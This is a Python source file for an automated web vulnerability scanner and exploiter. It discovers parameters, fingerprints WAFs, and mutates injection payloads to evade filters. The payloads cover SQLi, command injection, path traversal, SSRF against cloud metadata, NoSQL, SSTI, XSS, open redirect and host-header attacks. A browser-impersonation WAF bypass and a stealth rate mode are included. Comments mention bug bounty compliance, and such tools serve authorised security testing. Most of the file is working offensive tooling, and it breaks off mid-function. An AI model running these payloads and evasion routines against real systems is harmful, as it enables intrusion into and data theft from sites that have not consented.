import time
import json
import random
import os
import re
import statistics
import asyncio
import aiohttp
import argparse
import html as html_lib
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, quote, parse_qs, urlunparse, unquote
from bs4 import BeautifulSoup
from rich.console import Console, RenderResult
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
from rich.layout import Layout
from rich.live import Live
from rich.text import Text


# ==========================================
# ADAPTIVE RATE LIMITER (Token Bucket)
# ==========================================
class AdaptiveRateLimiter:
    """
    Fully async token bucket rate limiter with adaptive WAF-evasion behavior.
    acquire() sync shim retained only for executor-dispatched code paths.
    """
    def __init__(self, config=None):
        config = config or {}
        self.normal_rate    = config.get('normal_rate',    50)
        self.waf_base_rate  = config.get('waf_base_rate',   8)
        self.mutation_rate  = config.get('mutation_rate',   3)
        self.header_rate    = config.get('header_rate',     5)
        self.burst_size     = config.get('burst_size',     20)
        self.tokens         = self.burst_size
        self.last_update    = time.time()
        self.waf_detected       = False
        self.consecutive_429s   = 0
        self.consecutive_blocks = 0
        self.backoff_multiplier = 1.0
        self.max_backoff        = config.get('max_backoff', 30)
        self.jitter_range       = config.get('jitter_range', (0.0, 0.05))
        self.total_requests     = 0
        self.total_wait_time    = 0.0
        self.rate_adjustments   = 0
        self._async_lock        = None
        # Extra static headers to attach to every outgoing request.
        # Use this for bug bounty / engagement compliance requirements.
        # Example: {"X-Request-ID": "Bugcrowd"}
        self.extra_headers = config.get('extra_headers', {})
        # Hard ceiling — if set, no effective rate can ever exceed this value.
        # Use this for program-specific compliance (e.g. bug bounty 5 req/s cap).
        # When set, burst_size is also clamped to this value so the initial
        # burst cannot bypass the ceiling either.
        self.max_rate = config.get('max_rate', None)
        if self.max_rate is not None:
            self.burst_size = min(self.burst_size, self.max_rate)
            self.tokens     = self.burst_size

    def _get_async_lock(self):
        if self._async_lock is None:
            self._async_lock = asyncio.Lock()
        return self._async_lock

    def _get_effective_rate(self, is_mutation, location):
        if self.waf_detected:
            if is_mutation:            rate = self.mutation_rate
            elif location == 'header': rate = self.header_rate
            else:                      rate = self.waf_base_rate
        else:
            rate = self.normal_rate
        rate = rate / self.backoff_multiplier
        # Hard ceiling: clamp after all other adjustments so nothing bypasses it
        if self.max_rate is not None:
            rate = min(rate, self.max_rate)
        return rate

    def _calculate_extra_delay(self, is_mutation, location):
        delay = 0.0
        if self.waf_detected:
            if is_mutation:            delay += random.uniform(0.8, 2.5)
            elif location == 'header': delay += random.uniform(0.4, 1.2)
            else:                      delay += random.uniform(0.2, 0.8)
        else:
            lo, hi = self.jitter_range
            if hi > 0:
                delay += random.uniform(lo, hi)
        if self.consecutive_429s > 0:
            delay += min(2 ** self.consecutive_429s, self.max_backoff)
        return delay

    async def acquire_async(self, is_mutation=False, location='query'):
        async with self._get_async_lock():
            now     = time.time()
            elapsed = now - self.last_update
            rate    = self._get_effective_rate(is_mutation, location)
            extra   = self._calculate_extra_delay(is_mutation, location)
            self.tokens      = min(self.burst_size, self.tokens + elapsed * rate)
            self.last_update = now
            stats = {'rate': rate, 'tokens_remaining': self.tokens,
                     'backoff_multiplier': self.backoff_multiplier}
            if self.tokens >= 1:
                self.tokens         -= 1
                self.total_requests += 1
                self.total_wait_time += extra
                stats['wait_time']   = extra
            else:
                wait_time  = (1 - self.tokens) / rate
                total_wait = wait_time + extra
                self.tokens          = 0
                self.last_update     = time.time()
                self.total_requests += 1
                self.total_wait_time += total_wait
                stats['wait_time']        = total_wait
                stats['tokens_remaining'] = 0
                self._async_lock.release()
                try:
                    await asyncio.sleep(total_wait)
                finally:
                    await self._async_lock.acquire()
                return stats
        if stats.get('wait_time', 0) > 0:
            await asyncio.sleep(stats['wait_time'])
        return stats

    def acquire(self, is_mutation=False, location='query'):
        """Sync shim — only used inside run_in_executor callables."""
        rate  = self._get_effective_rate(is_mutation, location)
        extra = self._calculate_extra_delay(is_mutation, location)
        now   = time.time()
        self.tokens      = min(self.burst_size, self.tokens + (now - self.last_update) * rate)
        self.last_update = now
        self.total_requests += 1
        if self.tokens >= 1:
            self.tokens -= 1
            if extra > 0: time.sleep(extra)
            self.total_wait_time += extra
            return {'wait_time': extra, 'rate': rate}
        wait_time  = (1 - self.tokens) / rate
        total_wait = wait_time + extra
        self.tokens = 0; self.last_update = time.time()
        self.total_wait_time += total_wait
        time.sleep(total_wait)
        return {'wait_time': total_wait, 'rate': rate}

    def report_response(self, status_code, response_text=""):
        if status_code == 429:
            self.consecutive_429s  += 1
            self.backoff_multiplier = min(self.backoff_multiplier * 1.5, 10)
            self.rate_adjustments  += 1
            return 'rate_limited'
        block_indicators = [
            'Access Denied', 'Request Blocked', 'Too Many Requests', 'Rate limit',
            'Throttl', 'Slow down', 'Try again later', '429', 'cloudflare', 'challenge-platform'
        ]
        if status_code in [403, 503] or any(i.lower() in response_text.lower() for i in block_indicators):
            self.consecutive_blocks += 1
            if self.consecutive_blocks >= 3:
                self.backoff_multiplier = min(self.backoff_multiplier * 1.3, 8)
                self.rate_adjustments  += 1
            return 'blocked'
        if status_code == 200:
            if self.consecutive_429s   > 0: self.consecutive_429s   = max(0, self.consecutive_429s   - 1)
            if self.consecutive_blocks > 0: self.consecutive_blocks = max(0, self.consecutive_blocks - 1)
            if self.backoff_multiplier > 1.0:
                self.backoff_multiplier = max(1.0, self.backoff_multiplier - 0.1)
        return 'ok'

    def set_waf_detected(self, detected):
        self.waf_detected = detected
        if detected:
            self.backoff_multiplier = max(self.backoff_multiplier, 1.5)
        self.rate_adjustments += 1

    def get_stats(self):
        avg_wait = self.total_wait_time / max(1, self.total_requests)
        return {
            'total_requests':       self.total_requests,
            'total_wait_time':      round(self.total_wait_time, 2),
            'avg_wait_per_request': round(avg_wait, 3),
            'current_rate':         self._get_effective_rate(False, 'query'),
            'backoff_multiplier':   round(self.backoff_multiplier, 2),
            'consecutive_429s':     self.consecutive_429s,
            'consecutive_blocks':   self.consecutive_blocks,
            'rate_adjustments':     self.rate_adjustments,
            'waf_detected':         self.waf_detected,
        }

    def reset(self):
        self.tokens             = self.burst_size
        self.last_update        = time.time()
        self.consecutive_429s   = 0
        self.consecutive_blocks = 0
        self.backoff_multiplier = 1.0


# ==========================================
# ENTERPRISE PAYLOAD MUTATOR
# ==========================================
class PayloadMutator:

    @staticmethod
    def _sqli_mutations(payload):
        m = []
        m.append(("SQL_Tab",          payload.replace(" ", "%09")))
        m.append(("SQL_Newline",       payload.replace(" ", "%0a")))
        m.append(("SQL_Token_Comment", payload.replace("UNION","UNI/**/ON").replace("SELECT","SEL/**/ECT").replace("FROM","FR/**/OM")))
        m.append(("SQL_Paren_Wrap",    payload.replace("UNION ","UNION(").replace(" SELECT ","(SELECT ").replace(" FROM ",")FROM(").replace(" WHERE ",")WHERE ") + ")"))
        m.append(("SQL_LIKE",          payload.replace("=", " LIKE ")))
        m.append(("SQL_BETWEEN",       payload.replace("=1", " BETWEEN 0 AND 2")))
        m.append(("SQL_Or_Bar",        payload.replace(" OR ", " || ")))
        m.append(("SQL_Math_Equiv",    payload.replace("1=1","2-1=1").replace("1 = 1","2-1=1")))
        m.append(("SQL_MySQL_Ver",     payload.replace("UNION","/*!50000UNION*/").replace("SELECT","/*!50000SELECT*/").replace("FROM","/*!50000FROM*/")))
        if "'" in payload:
            m.append(("SQL_Hex_String", payload.replace("'","0x")))
        m.append(("HPP_PHP",  f"HPP_JSON:{json.dumps(['1', payload])}"))
        m.append(("HPP_Java", f"HPP_JSON:{json.dumps([payload, '1'])}"))
        return m

    @staticmethod
    def _cmdi_mutations(payload):
        m = []
        m.append(("CMDI_IFS",     payload.replace(" ","$IFS")))
        m.append(("CMDI_Glob",    payload.replace("cat","/???/??t").replace("ls","/???/??")))
        m.append(("CMDI_Newline", payload.replace(";","%0a").replace("| ","%0a")))
        m.append(("CMDI_Quote",   payload.replace("cat","c'a't").replace("ls","l's'").replace("id","i'd'")))
        m.append(("HPP_PHP",  f"HPP_JSON:{json.dumps(['1', payload])}"))
        m.append(("HPP_Java", f"HPP_JSON:{json.dumps([payload, '1'])}"))
        return m

    @staticmethod
    def _lfi_mutations(payload):
        m = []
        m.append(("LFI_DoubleDot",   payload.replace("../","....//")))
        m.append(("LFI_TripleDot",   payload.replace("../","..././")))
        m.append(("LFI_Encoded_Dot", payload.replace("../","%2e%2e/")))
        m.append(("LFI_Trailing",    payload.replace("../","../././././")))
        m.append(("HPP_PHP",  f"HPP_JSON:{json.dumps(['1', payload])}"))
        m.append(("HPP_Java", f"HPP_JSON:{json.dumps([payload, '1'])}"))
        return m

    @staticmethod
    def _ssrf_mutations(payload):
        m = []
        m.append(("SSRF_Decimal", payload.replace("127.0.0.1","2130706433").replace("169.254.169.254","2862039166")))
        m.append(("SSRF_Hex",     payload.replace("127.0.0.1","0x7f000001")))
        m.append(("SSRF_Octal",   payload.replace("127.0.0.1","0177.0.0.1")))
        m.append(("SSRF_IPv6",    payload.replace("127.0.0.1","[::1]")))
        if "169.254.169.254" in payload:
            m.append(("SSRF_Parse_Confusion", payload + "#@target.com"))
        m.append(("HPP_PHP",  f"HPP_JSON:{json.dumps(['1', payload])}"))
        m.append(("HPP_Java", f"HPP_JSON:{json.dumps([payload, '1'])}"))
        return m

    @staticmethod
    def _nosqli_mutations(payload):
        m = []
        m.append(("NoSQL_Space", payload.replace("$ne","$ ne").replace("$gt","$ gt").replace("$where","$ where")))
        m.append(("NoSQL_Regex", payload.replace('"$ne": ""','"$regex": "^((?!admin).)*$"').replace("'$ne': ''","'$regex': '^((?!admin).)*$'")))
        m.append(("NoSQL_Array", payload.replace('": ""','": [""]').replace("': ''","': ['']")))
        m.append(("HPP_PHP",  f"HPP_JSON:{json.dumps(['1', payload])}"))
        m.append(("HPP_Java", f"HPP_JSON:{json.dumps([payload, '1'])}"))
        return m

    @staticmethod
    def _ssti_mutations(payload):
        m = []
        m.append(("SSTI_Space",    payload.replace("{{","{ {").replace("}}","} }")))
        m.append(("SSTI_Math",     payload.replace("*","+")))
        m.append(("SSTI_Accessor", "{{config}}"))
        m.append(("HPP_PHP",  f"HPP_JSON:{json.dumps(['1', payload])}"))
        m.append(("HPP_Java", f"HPP_JSON:{json.dumps([payload, '1'])}"))
        return m

    @staticmethod
    def _xss_mutations(payload):
        m = []
        m.append(("XSS_Entity_JS", payload.replace("alert","&#97;lert").replace("onerror","&#111;nerror").replace("onload","&#111;nload")))
        m.append(("HPP_PHP",  f"HPP_JSON:{json.dumps(['1', payload])}"))
        m.append(("HPP_Java", f"HPP_JSON:{json.dumps([payload, '1'])}"))
        return m

    @staticmethod
    def _open_redirect_mutations(payload):
        m = []
        m.append(("Redir_Backslash",  payload.replace("https://","https:\\")))
        m.append(("Redir_Hex_Scheme", payload.replace("https://","%68%74%74%70%73://").replace("http://","%68%74%74%70://")))
        m.append(("Redir_Space",      payload.replace("evil.com","evil.com %00 ")))
        m.append(("HPP_PHP",  f"HPP_JSON:{json.dumps(['1', payload])}"))
        m.append(("HPP_Java", f"HPP_JSON:{json.dumps([payload, '1'])}"))
        return m

    @staticmethod
    def _host_header_mutations(payload):
        m = []
        m.append(("Host_Cred_Bypass",       f"target.com@{payload}"))
        m.append(("Host_Suffix_Bypass",      f"target.com.{payload}"))
        if not payload.startswith("http"):
            m.append(("Host_Absolute_URL",      f"https://{payload}"))
            m.append(("Host_Protocol_Relative", f"//{payload}"))
        return m

    @staticmethod
    def _referer_mutations(payload):
        m = []
        m.append(("Referer_Backslash",   payload.replace("https://","https:\\")))
        m.append(("Referer_Fragment",    f"{payload}#target.com"))
        m.append(("Referer_Cred_Bypass", payload.replace("evil.com","target.com@evil.com")))
        if "<script>" in payload.lower() or "alert" in payload.lower():
            m.append(("Referer_JS_Protocol", "javascript:alert(1)"))
        return m

    @staticmethod
    def get_modern_waf_mutations(base_payload, vector_name):
        if   "SQL_INJECTION"                 in vector_name: return PayloadMutator._sqli_mutations(base_payload)
        elif "COMMAND_INJECTION"             in vector_name: return PayloadMutator._cmdi_mutations(base_payload)
        elif "PATH_TRAVERSAL"                in vector_name: return PayloadMutator._lfi_mutations(base_payload)
        elif "SERVER_SIDE_REQUEST_FORGERY"   in vector_name: return PayloadMutator._ssrf_mutations(base_payload)
        elif "NOSQL_INJECTION"               in vector_name: return PayloadMutator._nosqli_mutations(base_payload)
        elif "SERVER_SIDE_TEMPLATE_INJECTION" in vector_name: return PayloadMutator._ssti_mutations(base_payload)
        elif "XSS"                           in vector_name: return PayloadMutator._xss_mutations(base_payload)
        elif "OPEN_REDIRECT"                 in vector_name: return PayloadMutator._open_redirect_mutations(base_payload)
        elif "HOST_HEADER_INJECTION"         in vector_name: return PayloadMutator._host_header_mutations(base_payload)
        elif "REFERER_INJECTION"             in vector_name: return PayloadMutator._referer_mutations(base_payload)
        hpp_last  = json.dumps(["1", base_payload])
        hpp_first = json.dumps([base_payload, "1"])
        return [("HPP_PHP_LastWins", f"HPP_JSON:{hpp_last}"), ("HPP_Java_FirstWins", f"HPP_JSON:{hpp_first}")]


# ==========================================
# TARGET STATE DATABASE
# ==========================================
class TargetStateDB:
    def __init__(self, console):
        self.findings         = []
        self.findings_index   = {}
        self.activity_log     = []
        self.console          = console
        self.waf_detected     = False
        self.waf_type         = "Unknown"
        self.rate_limit_stats = {}

    def log_activity(self, message, style="dim"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.activity_log.append(f"[{style}]{timestamp} - {message}[/{style}]")
        if len(self.activity_log) > 100:
            self.activity_log.pop(0)

    def log_finding(self, target, finding):
        unique_key = f"{target}_{finding.get('param')}_{finding.get('type')}_{finding.get('location')}"
        if unique_key in self.findings_index:
            idx      = self.findings_index[unique_key]
            existing = self.findings[idx]
            if 'proofs' not in existing:
                existing['proofs'] = [existing.get('payload')]
            payload = finding.get('payload')
            variant = finding.get('variant', 'Original')
            if variant == "Original" or not variant or "Comment" in variant:
                if payload not in existing['proofs']:
                    existing['proofs'].append(payload)
            count = len(existing['proofs'])
            existing['evidence']   = f"Confirmed via {count} payload variants."
            existing['confidence'] = "High"
            self.log_activity(f"Updated finding: [{finding['type']}] with variant payload", "yellow")
        else:
            finding['target']    = target
            finding['timestamp'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            finding['proofs']    = [finding.get('payload')]
            self.findings.append(finding)
            self.findings_index[unique_key] = len(self.findings) - 1
            self.log_activity(f"NEW VULN FOUND: [{finding['type']}] on Param [{finding['param']}]", "bold red")

    def generate_final_report(self):
        grouped = {}
        for finding in self.findings:
            vuln_type = finding.get('type', 'UNKNOWN')
            category  = vuln_type
            if   vuln_type.startswith("SQL_INJECTION_"):                   category = "SQL_INJECTION"
            elif vuln_type.startswith("NOSQL_INJECTION_"):                 category = "NOSQL_INJECTION"
            elif vuln_type.startswith("XSS_"):                             category = "XSS"
            elif vuln_type.startswith("COMMAND_INJECTION_"):               category = "COMMAND_INJECTION"
            elif vuln_type.startswith("SERVER_SIDE_TEMPLATE_INJECTION_"):  category = "SERVER_SIDE_TEMPLATE_INJECTION"
            elif vuln_type.startswith("SERVER_SIDE_PARAMETER_POLLUTION_") or vuln_type.startswith("SSPP_"): category = "SERVER_SIDE_PARAMETER_POLLUTION"
            elif vuln_type.startswith("OPEN_REDIRECT"):                    category = "OPEN_REDIRECT"
            elif vuln_type.startswith("SERVER_SIDE_REQUEST_FORGERY_"):     category = "SSRF"
            elif vuln_type.startswith("PATH_TRAVERSAL_"):                  category = "PATH_TRAVERSAL"
            elif vuln_type.startswith("POTENTIAL_DOS_"):                   category = "DENIAL_OF_SERVICE"
            elif vuln_type.startswith("HOST_HEADER_INJECTION"):            category = "HOST_HEADER_INJECTION"
            elif vuln_type.startswith("REFERER_INJECTION") or "_VIA_REFERER" in vuln_type: category = "REFERER_INJECTION"
            grouped.setdefault(category, []).append(finding)
        return {
            "scan_metadata": {
                "total_findings": len(self.findings),
                "generated_at":   datetime.now().isoformat(),
                "waf_status":     {"detected": self.waf_detected, "type": self.waf_type},
                "rate_limiting":  self.rate_limit_stats,
            },
            "findings": grouped,
        }

    def save_report(self, base_filename="exploiter_report"):
        report   = self.generate_final_report()
        filename = f"{base_filename}_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.json"
        with open(filename, 'w') as f:
            json.dump(report, f, indent=4)
        self.console.print(f"[green][+] Report saved to {filename}[/green]")


# ==========================================
# RICH UI RENDERERS
# ==========================================
class DynamicLog:
    def __init__(self, state_db): self.db = state_db
    def __rich_console__(self, console, options) -> RenderResult:
        yield Panel("\n".join(self.db.activity_log[-15:]),
                    title="[bold]Activity Log[/bold]", border_style="green", padding=(1, 1))


class LiveFindingsPanel:
    def __init__(self, state_db): self.db = state_db
    def __rich_console__(self, console, options) -> RenderResult:
        if not self.db.findings:
            yield Panel("[dim]Scanning... No vulnerabilities confirmed yet.[/dim]",
                        title="[bold]Live Findings[/bold]", border_style="dim")
            return
        table = Table(show_header=True, header_style="bold magenta", expand=True)
        table.add_column("Type",     style="red",    width=25)
        table.add_column("Param",    style="cyan",   width=15)
        table.add_column("Evidence", style="yellow")
        for f in self.db.findings:
            evidence = f.get('evidence', 'N/A')
            if len(evidence) > 40: evidence = evidence[:37] + "..."
            table.add_row(f.get('type', 'UNKNOWN'), f.get('param', 'N/A'), evidence)
        yield Panel(table,
                    title=f"[bold red]Live Findings ({len(self.db.findings)} Total)[/bold red]",
                    border_style="red")


class RateLimitPanel:
    def __init__(self, rate_limiter): self.limiter = rate_limiter
    def __rich_console__(self, console, options) -> RenderResult:
        stats = self.limiter.get_stats()
        if stats['consecutive_429s'] > 0:
            border_color = "red"
            status = f"[bold red]BACKING OFF ({stats['consecutive_429s']}x 429)[/bold red]"
        elif stats['waf_detected']:
            border_color = "yellow"
            status = f"[bold yellow]STEALTH MODE ({stats['backoff_multiplier']:.1f}x slower)[/bold yellow]"
        else:
            border_color = "green"
            status = "[bold green]NORMAL[/bold green]"
        grid = Table.grid(expand=True)
        grid.add_column(style="dim")
        grid.add_column(style="bold")
        grid.add_row("Status:",     status)
        grid.add_row("Rate:",       f"{stats['current_rate']:.1f} req/s")
        grid.add_row("Requests:",   str(stats['total_requests']))
        grid.add_row("Total Wait:", f"{stats['total_wait_time']:.1f}s")
        grid.add_row("Avg Delay:",  f"{stats['avg_wait_per_request']:.3f}s")
        yield Panel(grid, title="[bold]Rate Limiter[/bold]", border_style=border_color, padding=(0, 1))


# ==========================================
# ENTERPRISE INJECTION AGENT
# ==========================================
class EnterpriseInjectionAgent:
    def __init__(self, target_url, attack_db, state_db, console, progress_bar,
                 auth_config=None, endpoint_config=None, rate_limit_config=None):
        self.raw_target_url = target_url
        parsed              = urlparse(target_url)
        self.base_path      = parsed.path
        self.base_url       = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', '', ''))
        self.target_url     = self.base_url
        self.db              = attack_db
        self.state_db        = state_db
        self.console         = console
        self.progress        = progress_bar
        self.auth_config     = auth_config or {}
        self.endpoint_config = endpoint_config
        self.rate_limiter    = AdaptiveRateLimiter(rate_limit_config or {})
        self.discovered_params      = []
        self.calibration            = {'avg': 0.1, 'stdev': 0.05, 'max': 0.2}
        self.original_path_segments = []
        self.baseline_length        = 0
        self.baseline_json_keys     = set()
        self.baseline_text          = ""
        # Concurrency limits
        self._normal_concurrency   = 50
        self._waf_concurrency      = 8
        self._mutation_concurrency = 4
        self._session              = None
        self._executor             = ThreadPoolExecutor(max_workers=4)

    # ------------------------------------------------------------------
    # Auth headers
    # ------------------------------------------------------------------
    def _build_base_headers(self):
        headers   = {'User-Agent': 'EnterprisePlatform/5.0'}
        auth_type = self.auth_config.get('type')
        if auth_type == 'cookie':
            headers['Cookie']        = self.auth_config.get('value', '')
        elif auth_type == 'bearer':
            headers['Authorization'] = f"Bearer {self.auth_config.get('value', '')}"
        elif auth_type == 'header':
            headers.update(self.auth_config.get('headers', {}))
        # Extra static headers injected on every request.
        # Defined in rate_limit_config under "extra_headers": {"Key": "Value"}.
        # Example for bug bounty compliance:
        #   "extra_headers": {"X-Request-ID": "Bugcrowd"}
        extra = getattr(self.rate_limiter, 'extra_headers', {})
        headers.update(extra)
        return headers

    # ------------------------------------------------------------------
    # Entry point
    # ------------------------------------------------------------------
    async def run(self):
        connector = aiohttp.TCPConnector(limit=self._normal_concurrency, ssl=False)
        async with aiohttp.ClientSession(
            connector=connector,
            headers=self._build_base_headers(),
            connector_owner=True,
        ) as session:
            self._session = session
            try:
                await self._phase_1_recon()
                await self._phase_1_5_niche_analysis()
                await self._detect_waf()
                await self._phase_2_calibration()
                await self._phase_3_scanning()
                self.state_db.rate_limit_stats = self.rate_limiter.get_stats()
            except Exception as e:
                self.state_db.log_activity(f"CRITICAL ERROR: {str(e)}", "bold red")

    # ------------------------------------------------------------------
    # Thin async HTTP helpers
    # ------------------------------------------------------------------
    async def _get(self, url, **kwargs):
        kwargs.setdefault('timeout', aiohttp.ClientTimeout(connect=15, sock_read=30))
        kwargs.setdefault('allow_redirects', True)
        async with self._session.get(url, **kwargs) as r:
            text = await r.text(errors='replace')
            return r.status, text, dict(r.headers)

    async def _post(self, url, **kwargs):
        kwargs.setdefault('timeout', aiohttp.ClientTimeout(connect=15, sock_read=30))
        kwargs.setdefault('allow_redirects', True)
        async with self._session.post(url, **kwargs) as r:
            text = await r.text(errors='replace')
            return r.status, text, dict(r.headers)

    # ------------------------------------------------------------------
    # Phase 1 — async recon
    # ------------------------------------------------------------------
    async def _phase_1_recon(self):
        task = self.progress.add_task("[cyan]Phase 1: Recon (Discovery)", total=1)
        self.state_db.log_activity(f"Starting Recon on {self.raw_target_url}", "cyan")
        self._extract_path_params()

        if self.endpoint_config:
            methods_list   = self.endpoint_config.get('methods', [self.endpoint_config.get('method', 'GET')])
            req_method     = methods_list[0].upper() if methods_list else 'GET'
            params_obj     = self.endpoint_config.get('params', {})
            query_params   = self.endpoint_config.get('query_params',  params_obj.get('query', []))
            form_params    = self.endpoint_config.get('body_params',   params_obj.get('form',  []))
            runtime_params = params_obj.get('runtime', [])
            for p in query_params:
                self.discovered_params.append({'name': p, 'location': 'query', 'method': req_method})
            for p in form_params:
                self.discovered_params.append({'name': p, 'location': 'body',  'method': 'POST'})
            for p in runtime_params:
                self.discovered_params.append({'name': p, 'location': 'body',  'method': 'POST'})
            self.state_db.log_activity(f"Loaded {len(self.discovered_params)} params from JSON.", "green")
        else:
            parsed = urlparse(self.raw_target_url)
            if parsed.query:
                for param in parse_qs(parsed.query):
                    self.discovered_params.append({'name': param, 'location': 'query', 'method': 'GET'})
            try:
                await self.rate_limiter.acquire_async(is_mutation=False, location='query')
                status, text, _ = await self._get(self.base_url)
                self.rate_limiter.report_response(status, text)
                loop = asyncio.get_event_loop()
                soup = await loop.run_in_executor(
                    self._executor, lambda: BeautifulSoup(text, 'html.parser'))
                for form in soup.find_all('form'):
                    if form.get('method', 'get').upper() == 'POST':
                        for inp in form.find_all('input'):
                            name = inp.get('name')
                            if name:
                                self.discovered_params.append(
                                    {'name': name, 'location': 'body', 'method': 'POST'})
            except Exception:
                pass

        self.discovered_params.append({'name': 'Host',             'location': 'header', 'method': 'GET'})
        self.discovered_params.append({'name': 'Referer',          'location': 'header', 'method': 'GET'})
        self.discovered_params.append({'name': 'X-Forwarded-Host', 'location': 'header', 'method': 'GET'})
        self.state_db.log_activity("Appended Host, Referer, X-Forwarded-Host to injection vectors.", "cyan")
        self.progress.update(task, advance=1)

    def _extract_path_params(self):
        parsed   = urlparse(self.raw_target_url)
        segments = [s for s in parsed.path.split('/') if s]
        self.original_path_segments = segments
        for i, seg in enumerate(segments):
            is_param   = False
            param_name = f"PATH_SEG_{i}"
            if self.endpoint_config and 'path_params' in self.endpoint_config:
                if i < len(self.endpoint_config['path_params']):
                    is_param   = True
                    param_name = self.endpoint_config['path_params'][i]
            else:
                if   re.match(r'^\d+$', seg):               is_param = True
                elif re.match(r'^[0-9a-fA-F-]{36}$', seg):  is_param = True
                elif re.match(r'^[a-f0-9]{24,}$', seg):     is_param = True
            if is_param:
                self.discovered_params.append({
                    'name': param_name, 'location': 'path', 'method': 'GET',
                    'original_value': seg, 'index': i,
                })
                self.state_db.log_activity(f"Detected PATH Parameter: [{param_name}] = {seg}", "cyan")

    # ------------------------------------------------------------------
    # Phase 1.5 — concurrent niche probes
    # ------------------------------------------------------------------
    async def _phase_1_5_niche_analysis(self):
        if not self.discovered_params: return
        task      = self.progress.add_task("[cyan]Phase 1.5: Dynamic Analysis", total=4)
        param_obj = next((p for p in self.discovered_params if p['location'] == 'query'), None)
        if not param_obj:
            self.state_db.log_activity("Skipping generic analysis (No Query Params found).", "dim")
            self.progress.update(task, advance=4)
            return

        param_name = param_obj['name']

        async def probe_lower():
            await self.rate_limiter.acquire_async(is_mutation=False, location='query')
            try:
                status, text, _ = await self._get(self.base_url, params={param_name: "testcase"})
                self.rate_limiter.report_response(status, text)
                return text
            except Exception as e:
                self.state_db.log_activity(f"Recon request failed: {e}", "dim")
                return None

        async def probe_upper(lower_text):
            await self.rate_limiter.acquire_async(is_mutation=False, location='query')
            try:
                status, text, _ = await self._get(self.base_url, params={param_name.upper(): "testcase"})
                self.rate_limiter.report_response(status, text)
                if lower_text and len(text) != len(lower_text):
                    self.state_db.log_activity("Case Sensitivity Check: DIFFERENT RESPONSES", "yellow")
            except Exception:
                pass

        async def probe_hpp(lower_text):
            await self.rate_limiter.acquire_async(is_mutation=False, location='query')
            try:
                status, text, _ = await self._get(self.base_url, params={param_name: ["1", "2"]})
                self.rate_limiter.report_response(status, text)
                if lower_text and len(text) != len(lower_text):
                    self.state_db.log_activity("HPP Check: POLLUTION POSSIBLE", "red")
            except Exception:
                pass

        async def probe_array():
            await self.rate_limiter.acquire_async(is_mutation=False, location='query')
            try:
                status, text, _ = await self._get(self.base_url, params={f"{param_name}[]": "1"})
                self.rate_limiter.report_response(status, text)
                if "Array" in text or status == 500:
                    self.state_db.log_activity("Type Juggling Check: BACKEND TYPE SHIFT", "yellow")
            except Exception:
                pass

        lower_text, *_ = await asyncio.gather(probe_lower(), probe_array(), return_exceptions=True)
        lower_text = lower_text if isinstance(lower_text, str) else None
        await asyncio.gather(probe_upper(lower_text), probe_hpp(lower_text), return_exceptions=True)
        self.progress.update(task, advance=4)

    # ------------------------------------------------------------------
    # Phase 1.6 — WAF detection
    # ------------------------------------------------------------------
    async def _detect_waf(self):
        task = self.progress.add_task("[yellow]Phase 1.6: WAF Fingerprinting", total=1)
        self.state_db.log_activity("Scanning for Web Application Firewall...", "yellow")
        waf_triggers = [
            ("<script>alert(1)</script>", "XSS_Generic"),
            ("../../../etc/passwd",       "DT_Generic"),
            ("1' OR '1'='1",              "SQLI_Generic"),
        ]
        waf_signatures = {
            "Cloudflare":    ["cloudflare", "cf-ray"],
            "Akamai":        ["akamai"],
            "AWS WAF":       ["awselb", "x-amz-cf-id"],
            "ModSecurity":   ["ModSecurity", "Not Acceptable"],
            "Generic Block": ["Access Denied", "Forbidden", "Blocked", "Request Rejected"],
        }
        for payload, _ in waf_triggers:
            await self.rate_limiter.acquire_async(is_mutation=False, location='query')
            try:
                status, text, hdrs = await self._get(
                    self.base_url, params={'waf_test': payload},
                    timeout=aiohttp.ClientTimeout(connect=5, sock_read=5))
                rs = self.rate_limiter.report_response(status, text)
                if rs == 'rate_limited':
                    self.state_db.log_activity("Rate limited during WAF detection, backing off...", "yellow")
                    await asyncio.sleep(5)
                    self.rate_limiter.reset()
                    continue
                all_header_vals = ' '.join(hdrs.values())
                for waf_name, sigs in waf_signatures.items():
                    for sig in sigs:
                        if sig in all_header_vals or sig in text:
                            self.state_db.waf_detected = True
                            self.state_db.waf_type     = waf_name
                            self.state_db.log_activity(f"WAF DETECTED: {waf_name}", "bold red")
                            self.rate_limiter.set_waf_detected(True)
                            self.state_db.log_activity("Rate limiter switched to STEALTH mode", "yellow")
                            self.progress.update(task, advance=1)
                            await self._attempt_waf_bypass()
                            return
                if status in [403, 406, 429, 501]:
                    self.state_db.waf_detected = True
                    self.state_db.waf_type     = "Generic/Unknown"
                    self.state_db.log_activity(f"WAF BEHAVIOR DETECTED: Status {status}", "yellow")
                    self.rate_limiter.set_waf_detected(True)
                    self.state_db.log_activity("Rate limiter switched to STEALTH mode", "yellow")
                    self.progress.update(task, advance=1)
                    await self._attempt_waf_bypass()
                    return
            except Exception as e:
                self.state_db.log_activity(f"WAF probe error: {e}", "dim")
        self.progress.update(task, advance=1)

    async def _attempt_waf_bypass(self):
        self.state_db.log_activity("Initiating TLS/JS Bypass sequence...", "bold yellow")
        def _sync_bypass():
            try:
                from curl_cffi import requests as cffi_requests
                cffi_session = cffi_requests.Session(impersonate="chrome120")
                auth_type = self.auth_config.get('type')
                if auth_type == 'cookie':
                    cffi_session.headers.update({'Cookie': self.auth_config.get('value', '')})
                elif auth_type == 'bearer':
                    cffi_session.headers.update({'Authorization': f"Bearer {self.auth_config.get('value', '')}"})
                elif auth_type == 'header':
                    cffi_session.headers.update(self.auth_config.get('headers', {}))
                resp          = cffi_session.get(self.base_url, timeout=(15, 30))
                is_blocked    = resp.status_code in [403, 503]
                has_challenge = "challenge-platform" in resp.text or "Just a moment..." in resp.text
                return (not is_blocked and not has_challenge), resp
            except ImportError:
                return None, None
            except Exception as e:
                return False, str(e)

        loop        = asyncio.get_event_loop()
        success, _  = await loop.run_in_executor(self._executor, _sync_bypass)
        if success is None:
            self.state_db.log_activity("curl_cffi not installed. Cannot bypass WAF.", "bold red")
        elif success:
            self.state_db.log_activity("[bold green]WAF BYPASSED SUCCESSFULLY![/bold green]")
            self.state_db.log_activity("Maintaining reduced rate for stealth", "dim")
        else:
